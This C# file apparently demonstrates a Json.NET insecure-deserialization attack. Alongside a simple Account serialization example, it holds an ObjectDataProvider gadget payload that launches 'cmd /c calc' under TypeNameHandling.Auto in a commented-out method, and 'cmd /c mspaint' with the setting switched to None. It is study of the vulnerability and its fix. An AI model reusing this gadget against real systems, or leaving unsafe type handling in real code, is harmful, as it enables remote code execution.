using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace JasonDeser
{
    public class Account
    {
        public string Email { get; set; }
        public bool Active { get; set; }
        public DateTime CreatedDate { get; set; }
        public IList<string> Roles { get; set; }
    }
   
    class Program
    {
        //       static void openCalc()
        //         {
        //            string json = @"{ '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
        //        'MethodName':'Start',
        //        'MethodParameters':{
        //           '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        //        '$values':['cmd', '/c calc']
        //         },
        //    'ObjectInstance':{ '$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}";
        //  
        //          dynamic obj = JsonConvert.DeserializeObject<dynamic>(json, new JsonSerializerSettings
        //           { TypeNameHandling = TypeNameHandling.Auto} );
        //                                  //None
        //       }




        static void openPaint()
            
      {
         string json = @"{ '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
       'MethodName':'Start',
        'MethodParameters':{
                  '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
           '$values':['cmd', '/c mspaint']
      },
      'ObjectInstance':{ '$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}";
          
         dynamic obj = JsonConvert.DeserializeObject<dynamic>(json, new JsonSerializerSettings
          { TypeNameHandling = TypeNameHandling.None} );
                                    //None is only prevent code for this, we cant add like array or etc.
           }

        static void Main(string[] args)
        {
            Account objAcc = new Account();

            objAcc.Email = "email@gmail.com";
            objAcc.Active = true;
            objAcc.CreatedDate = new DateTime(2020, 06, 28);
            objAcc.Roles = new string[] { "User", "Admin" };

            string output = JsonConvert.SerializeObject(objAcc);
            Console.WriteLine("Serialize object: " + output);

            Console.ReadKey();

            Account deserAcc = JsonConvert.DeserializeObject<Account>(output);
            Console.WriteLine("de-Serialize object: ");
            Console.WriteLine("Emaial: " + deserAcc.Email);
            Console.WriteLine("Aactive: " + deserAcc.Active);
            Console.WriteLine("CreratedDate: " + deserAcc.CreatedDate);
            Console.WriteLine("Roles: " + deserAcc.Roles[0] + ", " + deserAcc);

            Console.ReadKey();

             // openCalc();
            
            openPaint();
        }
    }
}
